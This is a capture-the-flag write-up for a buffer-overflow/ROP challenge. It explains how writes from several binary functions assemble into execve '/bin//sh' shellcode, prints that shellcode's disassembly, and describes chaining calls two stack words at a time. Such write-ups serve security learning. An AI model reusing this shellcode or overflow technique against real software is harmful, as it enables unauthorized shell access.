This was a kinda easy ROP challenge, that was designed not to have to look for ROP gadgets or leak libc like others solved it.

The basic premise is a trivial BOF in the `tryme` function, that after checking in gdb allows to put 2 words on the stack, so 2 return addresses, so not much to ROP with really. The `welcome` function sets up 28 bytes of space with `mmap`, which then are filled up by some other functions:

```
52   0x000015e4 0x080495e4 GLOBAL FUNC   154      greasy_grove
53   0x0000137c 0x0804937c GLOBAL FUNC   154      tilted_towers
65   0x00001416 0x08049416 GLOBAL FUNC   154      snobby_shores
69   0x00001248 0x08049248 GLOBAL FUNC   154      loot_lake
78   0x0000154a 0x0804954a GLOBAL FUNC   154      junk_junction
80   0x000012e2 0x080492e2 GLOBAL FUNC   154      lonely_lodge
82   0x000014b0 0x080494b0 GLOBAL FUNC   154      dusty_depot
```

Each of those writes 4 bytes and increments a counter before the pointer to the 28 bytes buffer so that the next function writes further. We copied what each function wrote using gdb by setting breakpoints after each function, that can be found in the script under each function address (beware little endianness though).

Instead of bruteforcing the order in which those functions had to be called which was lazy, having experience writing shellcode I tried to figure out the puzzle piece by piece. There were telltale pieces, `towers` writing a `xor eax,eax` instruction, and `shores` writing a `push ASCII` with one byte missing, the rest was just identifying those words with my own shellcode, and putting together bits that belonged after each other. In the end it was possible to create shellcode with 24 bytes so only 6 functions instead of all 7: depot, grove, junction, lodge, lake, shores, towers (the lake just added the exit syscall): 

```
   0:   31 c0                   xor    eax, eax
   2:   50                      push   rax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx, esp
   f:   89 c1                   mov    ecx, eax
  11:   89 c2                   mov    edx, eax
  13:   b0 0b                   mov    al, 0xb
  15:   cd 80                   int    0x80
  17:   31                      .byte 0x31
```

Finally, as we had to call those 6 functions in order and then go to `win` to mprotect the shellcode and execute it, but with only 2 words on the stack with the buffer overflow, the simple solution was to do them one by one, calling a function, returning to `tryme` to read 2 more words, etc.

In the end nice easy ROP chall where the focus was putting together shellcode instead of actually finding gadgets!
